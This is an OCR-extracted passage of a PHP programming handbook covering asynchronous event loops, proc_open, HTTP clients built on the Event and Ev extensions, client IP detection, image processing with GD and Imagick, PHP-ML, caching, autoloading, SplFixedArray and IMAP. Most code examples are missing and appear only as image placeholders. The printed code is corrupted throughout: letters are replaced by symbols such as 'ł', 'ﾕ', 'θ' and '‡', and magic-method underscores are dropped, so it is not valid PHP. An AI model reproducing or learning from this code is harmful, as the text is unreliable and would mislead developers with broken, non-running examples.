Example of a simple PHP script:

![](image_rsrcN2W.jpg)

Example class definition file:

![](image_rsrcN2X.jpg)

Example of PHP embedded in HTML:

![](image_rsrcN2Y.jpg)

Chapter 70: As6nchronous programming

Section 70.1: Advantages of Generators

PHP 5.5 introduces Generators and the yield keyword, which allows us to write asynchronous code that looks more like synchronous code.

The yield expression is responsible for giving control back to the calling code and providing a point of resumption at that place. One can send a value along the yield instruction. The return value of this expression is either null or the value which was passed to Generator::send().

![](image_rsrcN2Z.jpg)

This mechanism can be used by a coroutine implementation to wait for Awaitables yielded by the Generator (by registering itself as a callback for resolution) and continue execution of the Generator as soon as the Awaitable is resolved.

Section 70.2: Using Icicle event loop

Icicle uses Awaitables and Generators to create Coroutines.

![](image_rsrcN30.jpg)

![](image_rsrcN31.jpg)

Section 70.3: Spawning non-blocking processes with proc\_open()

PHP has no support for running code concurrently unless you install extensions such as pthread. This can be sometimes bypassed by using proc\_open() and stream\_set\_blocking() and reading their output asynchronously.

If we split code into smaller chunks we can run it as multiple suprocesses. Then using stream\_set\_blocking() function we can make each subprocess also non-blocking. This means we can spawn multiple subprocesses and then check for their output in a loop (similarly to an even loop) and wait until all of them finish.

As an example we can have a small subprocess that just runs a loop and in each iteration sleeps randomly for 100 - 1000ms (note, the delay is always the same for one subprocess).

![](image_rsrcN32.jpg)

Then the main process will spawn subprocesses and read their output. We can split it into smaller blocks: Spawn subprocesses with proc\_open() .

![](image_rsrcN33.jpg)![](image_rsrcN34.jpg)![](image_rsrcN35.jpg)Make each subprocess non-blocking with stream\_set\_blocking(). Run a loop until all subprocesses finish using proc\_get\_status().

![](image_rsrcN36.jpg)Properly close file handles with the output pipe for each subprocess using fclose() and close process handles with proc\_close().

![](image_rsrcN37.jpg)

![](image_rsrcN38.jpg)

The output then contains mixture from all three subprocesses as they we're read by fread() (note, that in this case

proc1 ended much earlier than the other two):

![](image_rsrcN39.jpg)

Section 70.4: Reading serial port with Event and DIO

DIO streams are currently not recognized by the Event extension. There is no clean way to obtain the file descriptor encapsulated into the DIO resource. But there is a workaround:

![](image_rsrcN3A.jpg)open stream for the port with fopen();

![](image_rsrcN3B.jpg)make the stream non-blocking with stream\_set\_blocking();

![](image_rsrcN3C.jpg)obtain numeric file descriptor from the stream with EventUtil::getSocketFd();

![](image_rsrcN3D.jpg)![](image_rsrcN3E.jpg)pass the numeric file descriptor to dio\_fdopen() (currently undocumented) and get the DIO resource; add an Event with a callback for listening to the read events on the file descriptor;

![](image_rsrcN3F.jpg)in the callback drain the available data and process it according to the logic of your application.

dio.php

359

<?php

class Scanner {

protected $port; // porł pałh, e.g. /dev/płs/5 protected $fd; // numeric fiﾕe descripłor protected $base; // EvenłBase

protected $dio; // dio resource protected $e\_open; // Evenł protected $e\_read; // Evenł

public function  construct ($port) {

$this\->port \= $port;

$this\->base \= new EventBase();

}

public function  destruct() {

$this\->base\->exit();

if ($this\->e\_open)

$this\->e\_open\->free(); if ($this\->e\_read)

$this\->e\_read\->free(); if ($this\->dio)

dio\_close($this\->dio);

}

public function run() {

$stream \= fopen($this\->port, 'rb'); stream\_set\_blocking($stream, false);

$this\->fd \= EventUtil::getSocketFd($stream); if ($this\->fd < θ) {

fprintf(STDERR, "Failed attach to port, events: %d\\n", $events); return;

}

$this\->e\_open \= new Event($this\->base, $this\->fd, Event::WRITE, \[$this, '\_onOpen'\]);

$this\->e\_open\->add();

$this\->base\->dispatch();

fclose($stream);

}

public function \_onOpen($fd, $events) {

$this\->e\_open\->del();

$this\->dio \= dio\_fdopen($this\->fd);

// Caﾕﾕ ołher dio funcłions here, e.g.

dio\_tcsetattr($this\->dio, \[

'baud' \=> 96θθ,

'bits' \=> 8,

'stop' \=> 1, 'parity' \=> θ

\]);

$this\->e\_read \= new Event($this\->base, $this\->fd, Event::READ | Event::PERSIST, \[$this, '\_onRead'\]);

$this\->e\_read\->add();

}

![](image_rsrcN3G.jpg)public function \_onRead($fd, $events) { while ($data \= dio\_read($this\->dio, 1)) {

var\_dump($data);

360

![](image_rsrcN3H.jpg)

Testing

Run the following command in terminal A:

![](image_rsrcN3J.jpg)

![](image_rsrcN3K.jpg)The output may be different. Use the PTYs from the first couple of rows (/dev/pts/5 and /dev/pts/8, in particular). In terminal B run the above-mentioned script. You may need root privileges:

In terminal C send a string to the first PTY:

![](image_rsrcN3M.jpg)

Output:

![](image_rsrcN3N.jpg)

Section 70.5: HTTP Client Based on Event Extension

This is a sample HTTP client class based on Event extension.

![](image_rsrcN3P.jpg)

The class allows to schedule a number of HTTP requests, then run them asynchronously. http-client.php

\*   ![](image_rsrcN3R.jpg)Dispałches aﾕﾕ pending requesłs (evenłs)

\*

\*   @rełurn void

\*/

public function run() {

$this\->base\->dispatch();

}

public function  destruct() {

// Desłroy connecłion objecłs expﾕiciłﾕy, don'ł waił for GC.

// Ołherwise, EvenłBase may be free'd earﾕier.

$this\->connections \= null;

}

/\*\*

\*   @brief Adds a pending HTTP requesł

\*

\*   @param słring $address Hosłname, or IP

\*   @param inł $porł Porł number

\*   @param array $headers Exłra HTTP headers

\*   @param inł $cmd A EvenłHłłpRequesł::CMD\_\* consłanł

\*   @param słring $resource HTTP requesł resource, e.g. '/page?a=b&c=d'

\*

\*   @rełurn EvenłHłłpRequesł/faﾕse

\*/

public function addRequest($address, $port, array $headers,

$cmd \= EventHttpRequest::CMD\_GET, $resource \= '/')

{

$conn \= new EventHttpConnection($this\->base, null, $address, $port);

$conn\->setTimeout(5);

$req \= new EventHttpRequest(\[$this, '\_requestHandler'\], $this\->base); foreach ($headers as $k \=> $v) {

$req\->addHeader($k, $v, EventHttpRequest::OUTPUT\_HEADER);

}

$req\->addHeader('Host', $address, EventHttpRequest::OUTPUT\_HEADER);

$req\->addHeader('Connection', 'close', EventHttpRequest::OUTPUT\_HEADER); if ($conn\->makeRequest($req, $cmd, $resource)) {

$this\->connections \[\]= $conn; return $req;

}

return false;

}

/\*\*

\*   @brief Handﾕes an HTTP requesł

\*

\*   @param EvenłHłłpRequesł $req

\*   @param mixed $unused

\*

\*   @rełurn void

\*/

public function \_requestHandler($req, $unused) {

if (is\_null($req)) { echo "Timed out\\n";

} else {

$response\_code \= $req\->getResponseCode();

if ($response\_code \== θ) {​362

![](image_rsrcN3S.jpg)

test.php

This is a sample script on the server side.

![](image_rsrcN3T.jpg)

![](image_rsrcN3U.jpg)Usage

Sample Output

![](image_rsrcN3V.jpg)

![](image_rsrcN3W.jpg)

(Trimmed.)

Note, the code is designed for long-term processing in the CLI SAPI.

Section 70.6: HTTP Client Based on Ev Extension

This is a sample HTTP client based on Ev extension.

Ev extension implements a simple yet powerful general purpose event loop. It doesn't provide network-specific watchers, but its I/O watcher can be used for asynchronous processing of sockets.

![](image_rsrcN3X.jpg)

The following code shows how HTTP requests can be scheduled for parallel processing. http-client.php

![](image_rsrcN3R.jpg)$this\->http\_client \= $client;

$this\->host​\= $host;

$this\->resource​\= $resource;

$this\->method​\= $method;

// Geł łhe porł for łhe WWW service

$this\->service\_port \= getservbyname('www', 'tcp');

// Geł łhe IP address for łhe łargeł hosł

$this\->address \= gethostbyname($this\->host);

// Creałe a TCP/IP sockeł

$this\->socket \= socket\_create(AF\_INET, SOCK\_STREAM, SOL\_TCP); if (!$this\->socket) {

throw new RuntimeException("socket\_create() failed: reason: " . socket\_strerror(socket\_last\_error()));

}

// Seł O\_NONBLOCK fﾕag

socket\_set\_nonblock($this\->socket);

$this\->conn\_watcher \= $this\->http\_client\->getLoop()

\->timer(θ, θ., \[$this, 'connect'\]);

}

public function  destruct() {

$this\->close();

}

private function freeWatcher(&$w) { if ($w) {

$w\->stop();

$w \= null;

}

}

/\*\*

\*   Deaﾕﾕocałes aﾕﾕ resources of łhe requesł

\*/

private function close() {

if ($this\->socket) { socket\_close($this\->socket);

$this\->socket \= null;

}

$this\->freeWatcher($this\->timeout\_watcher);

$this\->freeWatcher($this\->read\_watcher);

$this\->freeWatcher($this\->write\_watcher);

$this\->freeWatcher($this\->conn\_watcher);

}

/\*\*

\*   Iniłiaﾕizes a connecłion on sockeł

\*   @rełurn booﾕ

\*/

public function connect() {

$loop \= $this\->http\_client\->getLoop();

$this\->timeout\_watcher \= $loop\->timer($this\->timeout, θ., \[$this, '\_onTimeout'\]);

$this\->write\_watcher \= $loop\->io($this\->socket, Ev::WRITE, \[$this, '\_onWritable'\]);

return socket\_connect($this\->socket, $this\->address, $this\->service\_port);

365

![](image_rsrcN3R.jpg)}

/\*\*

\* Caﾕﾕback for łimeouł (EvTimer) wałcher

\*/

public function \_onTimeout(EvTimer $w) {

$w\->stop();

$this\->close();

}

/\*\*

\* Caﾕﾕback which is caﾕﾕed when łhe sockeł becomes wriłabﾕe

\*/

public function \_onWritable(EvIo $w) {

$this\->timeout\_watcher\->stop();

$w\->stop();

$in \= implode("\\r\\n", \[

"{‡this->method} {‡this->resource} HTTP/1.1", "Host: {‡this->host}",

'Connection: Close',

\]) . "\\r\\n\\r\\n";

if (!socket\_write($this\->socket, $in, strlen($in))) { trigger\_error("Failed writing ‡in to socket", E\_USER\_ERROR); return;

}

$loop \= $this\->http\_client\->getLoop();

$this\->read\_watcher \= $loop\->io($this\->socket, Ev::READ, \[$this, '\_onReadable'\]);

// Conłinue running łhe ﾕoop

$loop\->run();

}

/\*\*

\* Caﾕﾕback which is caﾕﾕed when łhe sockeł becomes readabﾕe

\*/

public function \_onReadable(EvIo $w) {

// recv() 20 byłes in non-bﾕocking mode

$ret \= socket\_recv($this\->socket, $out, 2θ, MSG\_DONTWAIT);

if ($ret) {

// Słiﾕﾕ have dała ło read. Append łhe read chunk ło łhe buffer.

$this\->buffer .= $out;

} elseif ($ret \=== θ) {

// Aﾕﾕ is read

printf("\\n<<<<\\n%s\\n\>>>>", rtrim($this\->buffer));

fflush(STDOUT);

$w\->stop();

$this\->close(); return;

}

// Caughł EINPROGRESS, EAGAIN, or EWOULDBLOCK

if (in\_array(socket\_last\_error(), static::$e\_nonblocking)) { return;

}

$w\->stop();

$this\->close();​366

![](image_rsrcN3Y.jpg)}

}

/////////////////////////////////////

class MyHttpClient {

/// @var array Insłances of MyHłłpRequesł

private $requests \= \[\];

/// @var EvLoop

private $loop;

public function  construct() {

// Each HTTP cﾕienł runs iłs own evenł ﾕoop

$this\->loop \= new EvLoop();

}

public function  destruct() {

$this\->loop\->stop();

}

/\*\*

\* @rełurn EvLoop

\*/

public function getLoop() {

return $this\->loop;

}

/\*\*

\* Adds a pending requesł

\*/

public function addRequest(MyHttpRequest $r) {

$this\->requests \[\]= $r;

}

/\*\*

\* Dispałches aﾕﾕ pending requesłs

\*/

public function run() {

$this\->loop\-\>run();

}

}

/////////////////////////////////////

// Usage

$client \= new MyHttpClient();

foreach (range(1, 1θ) as $i) {

$client\->addRequest(new MyHttpRequest($client, 'my-host.local', '/test.php?a=' . $i, 'GET'));

}

$client\->run();

Testing

Suppose [http://my-hosł.ﾕocaﾕ/łesł.php](http://my-hosł.ﾕocaﾕ/łesł.php) script is printing the dump of $\_GET:

![](image_rsrcN3Z.jpg)

Then the output of php http\-client.php command will be similar to the following:

![](image_rsrcN40.jpg)

![](image_rsrcN41.jpg)

(trimmed)

Note, in PHP 5 the sockets extension may log warnings for EINPROGRESS, EAGAIN, and EWOULDBLOCK errno values. It is possible to turn off the logs with

![](image_rsrcN42.jpg)

Section 70.7: Using Amp event loop

Amp harnesses Promises \[another name for Awaitables\] and Generators for coroutine creation.

![](image_rsrcN43.jpg)

![](image_rsrcN44.jpg)

369

Chapter 71: How to Detect Client IP Address

Section 71.1: Proper use of HTTP\_X\_FORWARDED\_FOR

In the light of the latest httpoxy vulnerabilities, there is another variable, that is widely misused.

HTTP\_X\_FORWARDED\_FOR is often used to detect the client IP address, but without any additional checks, this can lead to security issues, especially when this IP is later used for authentication or in SQL queries without sanitization.

Most of the code samples available ignore the fact that HTTP\_X\_FORWARDED\_FOR can actually be considered as information provided by the client itself and therefore is not a reliable source to detect clients IP address. Some of the samples do add a warning about the possible misuse, but still lack any additional check in the code itself.

So here is an example of function written in PHP, how to detect a client IP address, if you know that client may be behind a proxy and you know this proxy can be trusted. If you don't known any trusted proxies, you can just use REMOTE\_ADDR

![](image_rsrcN45.jpg)

![](image_rsrcN46.jpg)

Chapter 72: Create PDF files in PHP

Section 72.1: Getting Started with PDFlib

This code requires that you use the PDFlib library for it to function properly.

![](image_rsrcN47.jpg)

Chapter 73: YAML in PHP

Section 73.1: Installing YAML extension

YAML does not come with a standard PHP installation, instead it needs to be installed as a PECL extension. On linux/unix it can be installed with a simple

![](image_rsrcN48.jpg)

Note that libyaml\-dev package must be installed on the system, as the PECL package is simply a wrapper around libYAML calls.

Installation on Windows machines is different - you can either download a pre-compiled DLL or build from sources.

Section 73.2: Using YAML to store application configuration

YAML provides a way to store structured data. The data can be a simple set of name-value pairs or a complex hierarchical data with values even being arrays.

Consider the following YAML file:

![](image_rsrcN49.jpg)

Let's say, it's saved as config.yaml. Then to read this file in PHP the following code can be used:

![](image_rsrcN4A.jpg)

print\_r will produce the following output:

![](image_rsrcN4B.jpg)

Now config parameters can be used by simply using array elements:

![](image_rsrcN4C.jpg)

Chapter 74: Image Processing with GD

Section 74.1: Image output

An image can be created using image\* functions, where \* is the file format.

They have this syntax in common:

![](image_rsrcN4D.jpg)

Saving to a file

If you want to save the image to a file, you can pass the filename, or an opened file stream, as $to. If you pass a stream, you don't need to close it, because GD will automatically close it.

For example, to save a PNG file:

![](image_rsrcN4E.jpg)

When using fopen, make sure to use the b flag rather than the t flag, because the file is a binary output.

Do not try to pass fopen("php://temp", $f) or fopen("php://memory", $f) to it. Since the stream is closed by the function after the call, you will be unable to use it further, such as to retrieve its contents.

Output as an HTTP response

If you want to directly return this image as the response of the image (e.g. to create dynamic badges), you don't need to pass anything (or pass null) as the second argument. However, in the HTTP response, you need to specify your content type:

![](image_rsrcN4F.jpg)

$mimeType is the MIME type of the format you are returning. Examples include image/png, image/gif and

image/jpeg.

Writing into a variable

![](image_rsrcN4G.jpg)

There are two ways to write into a variable. Using OB (Output Buffering)

Using stream wrappers

You may have many reasons that you don't want to use output buffering. For example, you may already have OB on. Therefore, an alternative is needed.

Using the stream\_wrapper\_register function, a new stream wrapper can be registered. Hence, you can pass a

![](image_rsrcN4H.jpg)

In this example, the GlobalStream class writes any input into the reference variable (i.e. indirectly write to the global variable of the given name). The global variable can later be retrieved directly.

There are some special things to note:

![](image_rsrcN4J.jpg)A fully implemented stream wrapper class should look like this, but according to tests with the  call magic method, only stream\_open, stream\_write and stream\_close are called from internal functions.

![](image_rsrcN4K.jpg)No flags are required in the fopen call, but you should at least pass an empty string. This is because the fopen function expects such parameter, and even if you don't use it in your stream\_open implementation, a dummy one is still required.

![](image_rsrcN4M.jpg)According to tests, stream\_write is called multiple times. Remember to use .= (concatenation assignment), not \= (direct variable assignment).

Example usage

In the <img> HTML tag, an image can be directly provided rather than using an external link:

![](image_rsrcN4N.jpg)

Section 74.2: Creating an image

To create a blank image, use the imagecreatetruecolor function:

![](image_rsrcN4P.jpg)

$img is now a resource variable for an image resource with $widthx$height pixels. Note that width counts from left to right, and height counts from top to bottom.

Image resources can also be created from image creation functions, such as:

![](image_rsrcN4R.jpg)![](image_rsrcN4S.jpg)imagecreatefrompng

![](image_rsrcN4T.jpg)other imagecreatefrom\* functions.

Image resources may be freed later when there are no more references to them. However, to free the memory immediately (this may be important if you are processing many large images), using imagedestroy() on an image when it is no longer used might be a good practice.

![](image_rsrcN4U.jpg)

Converting an image

Images created by image conversion does not modify the image until you output it. Therefore, an image converter can be as simple as three lines of code:

![](image_rsrcN4V.jpg)

Section 74.3: Image Cropping and Resizing

If you have an image and want to create a new image, with new dimensions, you can use imagecopyresampled

function:

first create a new image with desired dimensions:

![](image_rsrcN4W.jpg)

and store the original image into a variable. To do so, you may use one of the createimagefrom\* functions where \* stands for:

![](image_rsrcN4X.jpg)![](image_rsrcN4Y.jpg)![](image_rsrcN4Z.jpg)![](image_rsrcN50.jpg)jpeg gif png string

For example:

![](image_rsrcN51.jpg)

Now, copy all (or part of) original image (src\_img) into the new image (dst\_img) by imagecopyresampled:

![](image_rsrcN52.jpg)

To set src\_\* and dst\_\* dimensions, use the below image:

![](image_rsrcN53.jpg)

Now, if you want to copy entire of source (initial) image, into entire of destination area (no cropping):

![](image_rsrcN54.jpg)

Chapter 75: Imagick

Section 75.1: First Steps

Installation

Using apt on Debian based systems

![](image_rsrcN55.jpg)

Using Homebrew on OSX/macOs

![](image_rsrcN56.jpg)

To see the dependencies installed using the brew method, visit brewformulas.org/Imagemagick.

Using binary releases

Instructions on imagemagick website.

Usage

![](image_rsrcN57.jpg)

Section 75.2: Convert Image into base64 String

This example is how to turn an image into a Base64 string (i.e. a string you can use directly in a src attribute of an

img tag). This example specifically uses the Imagick library (there are others available, such as GD as well).

![](image_rsrcN58.jpg)

![](image_rsrcN59.jpg)

Chapter 76: SOAP Server

Section 76.1: Basic SOAP Server

![](image_rsrcN5A.jpg)

Chapter 77: Machine learning

Section 77.1: Classification using PHP-ML

![](image_rsrcN5B.jpg)Classification in Machine Learning is the problem that identifies to which set of categories does a new observation belong. Classification falls under the category of Supervised Machine Learning.

Any algorithm that implements classification is known as classifier

The classifiers supported in PHP-ML are

![](image_rsrcN5C.jpg)![](image_rsrcN5D.jpg)SVC (Support Vector Classification) k-Nearest Neighbors

![](image_rsrcN5E.jpg)Naive Bayes

The train and predict method are same for all classifiers. The only difference would be in the underlying algorithm used.

SVC (Support Vector Classification)

Before we can start with predicting a new observation, we need to train our classifier. Consider the following code

![](image_rsrcN5F.jpg)

The code is pretty straight forward. $cost used above is a measure of how much we want to avoid misclassifying each training example. For a smaller value of $cost you might get misclassified examples. By default it is set to 1.0

Now that we have the classifier trained we can start making some actual predictions. Consider the following codes that we have for predictions

![](image_rsrcN5G.jpg)

The classifier in the case above can take unclassified samples and predicts there labels. predict method can take a single sample as well as an array of samples.

k-Nearest Neighbors

The classfier for this algorithm takes in two parameters and can be initialized like

![](image_rsrcN5H.jpg)

$neighbor\_num is the number of nearest neighbours to scan in knn algorithm while the second parameter is distance metric which by default in first case would be Euclidean. More on Minkowski can be found here.

Following is a short example on how to use this classifier

![](image_rsrcN5J.jpg)

NaiveBayes Classifier

![](image_rsrcN5K.jpg)NaiveBayes Classifier is based on Bayes' theorem and does not need any parameters in constructor. The following code demonstrates a simple prediction implementation

Practical case

![](image_rsrcN5M.jpg)Till now we only used arrays of integer in all our case but that is not the case in real life. Therefore let me try to describe a practical situation on how to use classifiers.

Suppose you have an application that stores characteristics of flowers in nature. For the sake of simplicity we can consider the color and length of petals. So there two characteristics would be used to train our data. color is the simpler one where you can assign an int value to each of them and for length, you can have a range like (θ mm,1θ mm)=1 , (1θ mm,2θ mm)=2. With the initial data train your classifier. Now one of your user needs identify the kind of flower that grows in his backyard. What he does is select the color of the flower and adds the length of the petals. You classifier running can detect the type of flower ("Labels in example above")

Section 77.2: Regression

In classification using PHP\-ML we assigned labels to new observation. Regression is almost the same with difference being that the output value is not a class label but a continuous value. It is widely used for predictions and forecasting. PHP-ML supports the following regression algorithms

![](image_rsrcN5N.jpg)![](image_rsrcN5P.jpg)Support Vector Regression LeastSquares Linear Regression

Regression has the same train and predict methods as used in classification. Support Vector Regression

This is the regression version for SVM(Support Vector Machine).The first step like in classification is to train our model.

![](image_rsrcN5R.jpg)

In regression $targets are not class labels as opposed to classification. This is one of the differentiating factor for the two. After training our model with the data we can start with the actual predictions

![](image_rsrcN5S.jpg)

Note that the predictions return a value outside the target. LeastSquares Linear Regression

This algorithm uses least squares method to approximate solution. The following demonstrates a simple code of training and predicting

![](image_rsrcN5T.jpg)

PHP-ML also provides with the option of Multiple Linear Regression. A sample code for the same can be as follows

![](image_rsrcN5U.jpg)

Multiple Linear Regression is particularly useful when multiple factors or traits identify the outcome. Practical case

![](image_rsrcN5V.jpg)Now let us take an application of regression in real life scenario.

Suppose you run a very popular website, but the traffic keeps on changing. You want a solution that would predict the number of servers you need to deploy at any given instance of time. Lets assume for the sake that your hosting provider gives you an api to spawn out servers and each server takes 15 minutes to boot. Based on previous data of traffic, and regression you can predict the traffic that would hit your application at any instance of time. Using that knowledge you can start a server 15 minutes before the surge thereby preventing your application from going onine.

Section 77.3: Clustering

Clustering is about grouping similar objects together. It is widely used for pattern recognition. Clustering comes under unsupervised machine learning, therefore there is no training needed. PHP-ML has support for the following clustering algorithms

![](image_rsrcN5W.jpg)![](image_rsrcN5X.jpg)k-Means dbscan

k-Means

k-Means separates the data into n groups of equal variance. This means that we need to pass in a number n which would be the number of clusters we need in our solution. The following code will help bring more clarity

![](image_rsrcN5Y.jpg)

Note that the output contains 3 arrays because because that was the value of n in KMeans constructor. There can also be an optional second parameter in the constructor which would be the initialization method. For example consider

![](image_rsrcN5Z.jpg)

INIT\_RANDOM places a completely random centroid while trying to determine the clusters. But just to avoid the centroid being too far away from the data, it is bound by the space boundaries of data.

The default constructor initialization method is kmeans++ which selects centroid in a smart way to speed up the process.

DBSCAN

As opposed to KMeans, DBSCAN is a density based clustering algorithm which means that we would not be passing n which would determine the number of clusters we want in our result. On the other hand this requires two parameters to work

1.  $minSamples : The minimum number of objects that should be present in a cluster

2.  $epsilon : Which is the maximum distance between two samples for them to be considered as in the same cluster.

A quick sample for the same is as follows

![](image_rsrcN60.jpg)

The code is pretty much self explanatory. One major difference is that there is no way of knowing the number of elements in output array as opposed to KMeans.

Practical Case

Let us now have a look on using clustering in real life scenario

![](image_rsrcN61.jpg)Clustering is widely used in pattern recognition and data mining. Consider that you have a content publishing application. Now in order to retain your users they should look at content that they love. Let us assume for the sake of simplicity that if they are on a specific webpage for more that a minute and they scoll to bottom then they love that content. Now each of your content will be having a unique identifier with it and so will the user. Make cluster based on that and you will get to know which segment of users have a similar content taste. This in turn could be used in recommendation system where you can assume that if some users of same cluster love the article then so will others and that can be shown as recommendations on your application.

Chapter 78: Cache

Section 78.1: Caching using memcache

Memcache is a distributed object caching system and uses key\-value for storing small data. Before you start calling Memcache code into PHP, you need to make sure that it is installed. That can be done using class\_exists method in php. Once it is validated that the module is installed, you start with connecting to memcache server instance.

![](image_rsrcN62.jpg)

![](image_rsrcM38.jpg)This will validate that Memcache php-drivers are installed and connect to memcache server instance running on localhost.

Memcache runs as a daemon and is called memcached

In the example above we only connected to a single instance, but you can also connect to multiple servers using

![](image_rsrcN63.jpg)

Note that in this case unlike connect , there won't be any active connection until you try to store or fetch a value. In caching there are three important operations that needs to be implemented

1.  Store data : Add new data to memcached server

2.  Get data : Fetch data from memcached server

3.  Delete data : Delete already existing data from memcached server Store data

$cache or memcached class object has a set method that takes in a key,value and time to save the value for (ttl).

![](image_rsrcN64.jpg)

Here $ttl or time to live is time in seconds that you want memcache to store the pair on server. Get data

$cache or memcached class object has a get method that takes in a key and returns the corresponding value.

![](image_rsrcN65.jpg)

![](image_rsrcM38.jpg)In case there is no value set for the key it will return null

Delete data

Sometimes you might have the need to delete some cache value.$cache or memcache instance has a delete

method that can be used for the same.

![](image_rsrcN66.jpg)

Small scenario for caching

Let us assume a simple blog. It will be having multiple posts on landing page that get fetched from database with each page load. In order to reduce the sql queries we can use memcached to cache the posts. Here is a very small implementation

![](image_rsrcN67.jpg)

Section 78.2: Cache Using APC Cache

The Alternative PHP Cache (APC) is a free and open opcode cache for PHP. Its goal is to provide a free, open, and robust framework for caching and optimizing PHP intermediate code.

installation

![](image_rsrcN68.jpg)

Add Cache:

![](image_rsrcN69.jpg)

Delete Cache:

![](image_rsrcN6A.jpg)

Set Cache Example:

![](image_rsrcN6B.jpg)

![](image_rsrcN6C.jpg)

Performance:

![](image_rsrcN6D.jpg)

APC is nearly 5 times faster than Memcached.

![](image_rsrcN6E.jpg)

390

Chapter 79: Autoloading Primer

Section 79.1: Autoloading as part of a framework solution

![](image_rsrcN6F.jpg)

Thanks to our generic autoloader, we have access to any class that follows our autoloader naming convention. In this example, our convention is simple: the desired class must have a file in the same directory named for the class and ending in ".php". Notice that the class name exactly matches the file name.

Without autoloading, we would have to manually require base classes. If we built an entire zoo of animals, we'd have thousands of require statements that could more easily be replaced with a single autoloader.

In the final analysis, PHP autoloading is a mechanism to help you write less mechanical code so you can focus on solving business problems. All you have to do is define a strategy that maps class name to file name. You can roll your own autoloading strategy, as done here. Or, you can use any of the standard ones the PHP community has adopted: PSR-0 or PSR-4. Or, you can use composer to generically define and manage these dependencies.

Section 79.2: Inline class definition, no loading required

![](image_rsrcN6G.jpg)

![](image_rsrcN6H.jpg)

PHP knows what Animal is before executing new Animal, because PHP reads source files top-to-bottom. But what if we wanted to create new Animals in many places, not just in the source file where it's defined? To do that, we need to load the class definition.

Section 79.3: Manual class loading with require

![](image_rsrcN6J.jpg)

Here we have three files. One file ("Animal.php") defines the class. This file has no side effects besides defining the class and neatly keeps all the knowledge about an "Animal" in one place. It's easily version controlled. It's easily reused.

Two files consume the "Animal.php" file by manually require\-ing the file. Again, PHP reads source files top-to- bottom, so the require goes and finds the "Animal.php" file and makes the Animal class definition available before calling new Animal.

Now imagine we had dozens or hundreds of cases where we wanted to perform new Animal. That would require (pun-intended) many, many require statements that are very tedious to code.

Section 79.4: Autoloading replaces manual class definition loading

![](image_rsrcN6K.jpg)

![](image_rsrcN6M.jpg)

Compare this to the other examples. Notice how require "Animal.php" was replaced with require "autoload.php". We're still including an external file at run-time, but rather than including a specific class definition we're including logic that can include any class. It's a level of indirection that eases our development. Instead of writing one require for every class we need, we write one require for all classes. We can replace N require with 1 require.

The magic happens with spl\_autoload\_register. This PHP function takes a closure and adds the closure to a queue of closures. When PHP encounters a class for which it has no definition, PHP hands the class name to each closure in the queue. If the class exists after calling a closure, PHP returns to its previous business. If the class fails to exist after trying the entire queue, PHP crashes with "Class 'Whatever' not found."

Section 79.5: Autoloading with Composer

Composer generates a vendor/autoload.php file.

You might simply include this file and you will get autoloading for free.

require  DIR  . '/vendor/autoload.php';

This makes working with third-party dependencies very easy.

You can also add your own code to the Autoloader by adding an autoload section to your composer.json.

![](image_rsrcN6N.jpg)

In this section you define the autoload mappings. In this example its a PSR-4 mapping of a namespace to a directory: the /src directory resides in your projects root folder, on the same level as the /vendor directory is. An example filename would be src/Foo.php containing an YourApplicationNamespace\\Foo class.

Important: After adding new entries to the autoload section, you have to re-run the command dump\-autoload to re-generate and update the vendor/autoload.php file with the new information.

In addition to PSR\-4 autoloading, Composer also supports PSR\-θ, classmap and files autoloading. See the autoload reference for more information.

When you including the /vendor/autoload.php file it will return an instance of the Composer Autoloader. You might store the return value of the include call in a variable and add more namespaces. This can be useful for autoloading classes in a test suite, for example.

![](image_rsrcN6P.jpg)

393

Chapter 80: SPL data structures

Section 80.1: SplFixedArra6

Difference from PHP Array

PHP's default Array type is actually implemented as ordered hash maps, which allow us to create arrays that consist of key/value pairs where values can be of any type and keys can be either numbers or strings. This is not traditionally how arrays are created, however.

![](image_rsrcN6R.jpg)

So as you can see from this illustration a normal PHP array can be viewed more like an an ordered set of key/value pairs, where each key can map to any value. Notice in this array we have keys that are both numbers and strings, as well as values of different types and the key has no bearing on the order of the elements.

![](image_rsrcN6S.jpg)

![](image_rsrcN6T.jpg)

So the above code would give us exactly what we'd expect. 9 => foo 1 => 4.2 bar =>

Regular PHP arrays are also dynamically sized for us. They grow and shrink as we push and pop values to and from the array, automatically.

However, in a traditional array the size is fixed and consists entirely of the same type of value. Also, rather than keys each value is access by its index, which can be deduced by its offset in the array.

![](image_rsrcN6U.jpg)

Since we would know the size of a given type and the fixed size of the array an offset is then the type size \* n were n represents the value's position in the array. So in the example above $arr\[θ\] gives us 1, the first element in the array and $arr\[1\] gives us 2, and so on.

SplFixedArray, however, doesn't restrict the type of values. It only restricts the keys to number types. It's also of a fixed size.

This makes SplFixedArrays more efficient than normal PHP arrays in one particular way. They are more compact so they require less memory.

Instantiating the array

SplFixedArray is implemented as an object, but it can be accessed with the same familiar syntax that you access a normal PHP array since they implement the ArrayAccess interface. They also implement Countable and Iterator interfaces so they behave the same way you'd be used to arrays behaving in PHP (i.e. things like count($arr) and foreach($arr as $k \=> $v) work the same way for SplFixedArray as they do normal arrays in PHP.

The SplFixedArray constructor takes one argument, which is the size of the array.

$arr \= new SplFixedArray(4);

![](image_rsrcN6V.jpg)

This gives you what you would expect. 0 => foo 1 => bar 2 => baz 3 =>

This also works as expected.

![](image_rsrcN6W.jpg)

Gives us... int(4)

Notice in SplFixedArray, unlike a normal PHP Array, the key does depict the order of the element in our array,

because it is a true index and not just a map. Resizing the array

Just keep in mind that because the array is of a fixed size, count will always return the same value. So while

unset($arr\[1\]) will result in $arr\[1\] === null, count($arr) still remains 4.

So to resize the array you will need to call on the setSize method.

![](image_rsrcN6X.jpg)

Now we get...

int(3) 0 => foo 1 => 2 => baz Import to SplFixedArray & Export from SplFixedArray

You can also import/export a normal PHP Array into and out of an SplFixedArray with the fromArray and toArray

methods.

![](image_rsrcN6Y.jpg)

1 2 3 4 5

Going the other way.

$fixedArray \= new SplFixedArray(5);

![](image_rsrcN6Z.jpg)

1 2 3 4 5

Chapter 81: IMAP

Section 81.1: Connecting to a mailbox

To do anything with an IMAP account you need to connect to it first. To do this you need to specify some required parameters:

![](image_rsrcN70.jpg)![](image_rsrcN71.jpg)The server name or IP address of the mail server The port you wish to connect on

![](image_rsrcN72.jpg)IMAP is 143 or 993 (secure)

![](image_rsrcN73.jpg)POP is 110 or 995 (secure)

SMTP is 25 or 465 (secure)

![](image_rsrcN74.jpg)

![](image_rsrcN75.jpg)![](image_rsrcN76.jpg)NNTP is 119 or 563 (secure) Connection flags (see below)

Flag​Description​​Options Default imap,

/service\=service Which service to use

/user\=user​remote user name for login on the server

![](image_rsrcN77.jpg)

